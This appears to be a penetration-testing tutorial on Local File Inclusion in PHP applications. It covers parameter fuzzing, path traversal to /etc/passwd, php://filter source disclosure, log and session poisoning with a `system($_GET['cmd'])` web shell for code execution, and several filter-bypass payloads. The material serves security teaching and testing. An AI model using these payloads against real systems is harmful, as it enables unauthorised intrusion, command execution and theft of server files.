**Local File Inclusion (LFI)** is a web vulnerability that occurs when an application includes files from the server using **user-controlled input without proper validation**.

This usually happens when functions like `include()`, `require()`, or similar are used dynamically.

---

## Identifying LFI

Look for parameters that reference files:

- `file=`
    
- `page=`
    
- `template=`
    
- `lang=`
    
- `view=`
    

**Example:**

```bash
http://example.com/index.php?page=home.php
```

If modifying the parameter changes page content, it may indicate file inclusion.

In some cases, parameters may not be visible in forms, so they need to be discovered manually or through fuzzing.

To discover hidden parameters, we use a parameter wordlist:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://target/index.php?FUZZ=test' -fs 2287
```

Once a parameter is identified (e.g., `page` or `language`), we can test it for LFI.

A commonly used wordlist is `/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`.

```bash
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://target/index.php?page=FUZZ' -fs 2287
```

This helps quickly identify working payloads without manually testing each one.

---

## Path Traversal

Applications often restrict inclusion to a directory:

```php
include("./languages/" . $_GET['language']);
```

The application prepends a directory but does not sanitize traversal sequences.

```bash
http://target/index.php?language=../../../../etc/passwd
```

This works because:

- `../` moves up directories
    
- Allows escaping restricted paths
    
- Eventually reaches root `/`
    

---

## PHP Wrappers (Source Code Disclosure)

PHP wrappers allow interaction with file streams before execution.

The filter converts file content into Base64, preventing execution and returning raw source.

```bash
http://target/index.php?file=php://filter/convert.base64-encode/resource=index.php
```

Decode locally:

```bash
echo "<base64>" | base64 -d
```

---
## Log Poisoning via LFI for RCE

Log poisoning exploits the fact that applications store **user-controlled input** in log or session files.

If these files are later included through an LFI vulnerability, any injected PHP code will be executed.

This technique relies on two conditions:

- We can **write controllable data** into a file
    
- The application can **include that file via LFI**
    


### Server Log Poisoning

Web servers log request data such as headers (e.g., `User-Agent`), which we fully control.

If logs are readable and included, we can inject PHP code into them.

#### Step 1: Inject payload into logs

We send a request with a malicious header:

```bash
User-Agent: <?php system($_GET['cmd']); ?>
```

Using curl:

```bash
curl -s "http://target/index.php" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

#### Step 2: Include log file

If the application has read access to logs, we include them via LFI:

```bash
http://target/index.php?page=/var/log/apache2/access.log
```


#### Step 3: Execute command

Once included, the injected PHP code is executed:

```bash
http://target/index.php?page=/var/log/apache2/access.log&cmd=id
```

#### Common Log Locations

**Apache:**

```bash
/var/log/apache2/access.log
/var/log/apache2/error.log
```

**Nginx:**

```bash
/var/log/nginx/access.log
/var/log/nginx/error.log
```

**Other logs:**

```bash
/var/log/php_errors.log
/var/log/sshd.log
/var/log/vsftpd.log
```


### PHP Session Poisoning

PHP applications store session data in files on disk. Some session values may be controlled by the user.

If we can inject PHP code into a session file and include it via LFI, we achieve RCE.

#### Step 1: Identify session file

Check your session cookie:

```bash
PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd
```

Session file location:

```bash
/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

#### Step 2: Confirm controllable input

Set a custom value through the application:

```bash
http://target/index.php?language=test
```

Then include the session file:

```bash
http://target/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

#### Step 3: Inject PHP payload

We inject a web shell through a controllable parameter:

```bash
http://target/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

#### Step 4: Execute command

Include the session file and execute commands:

```bash
http://target/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

---

## Second-Order LFI

Second-order LFI occurs when input is stored and later used in file inclusion.

The application trusts stored values and does not validate them when reused.

```bash
/profile/<username>/avatar.png
```

Example payload:

```bash
../../../etc/passwd
```

---

## Basic Bypasses

In real scenarios, web applications often implement basic protections against LFI. However, many of these defenses are flawed and can be bypassed with relatively simple techniques.

### Non-Recursive Path Traversal Filters

Some applications attempt to block traversal by removing `../`:

```php
$language = str_replace('../', '', $_GET['language']);
```

This filter only runs once and does not re-check the modified input.

The payload is designed so that after the filter removes part of it, a valid traversal sequence is still formed.

```bash
http://target/index.php?language=....//....//....//....//etc/passwd
```

**Why it works:**

- `....//` becomes `../` after filtering
    
- The filter is not recursive
    
- Traversal sequences are reconstructed after replacement
    

Other variants:

```bash
..././
....\/
....////
```


### Encoding Bypass

Some filters block characters like `.` or `/`.

Encoding hides these characters from the filter while keeping their meaning after decoding.

```bash
http://target/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```


### Approved Paths Bypass

Some applications enforce a specific directory using regex:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language']))
```

The payload starts with an allowed path, then escapes it using traversal.

```bash
http://target/index.php?language=./languages/../../../../etc/passwd
```

### Appended Extension Bypass (Concept)

Applications may enforce extensions:

```php
include($_GET['page'] . ".php");
```

Modern PHP versions make this hard to bypass directly, but older techniques exist.

#### Path Truncation (Old PHP)

Older PHP versions truncate long strings (~4096 characters).

A very long payload is used so the appended `.php` gets cut off.

```bash
?language=non_existing_directory/../../../etc/passwd/././././...
```

#### Null Byte Injection (Old PHP)

Older PHP versions interpret `%00` as end-of-string.

```bash
http://target/index.php?language=/etc/passwd%00
```

**Why it works:**

- `%00` terminates the string in memory
    
- `.php` is ignored
    
- Only `/etc/passwd` is processed
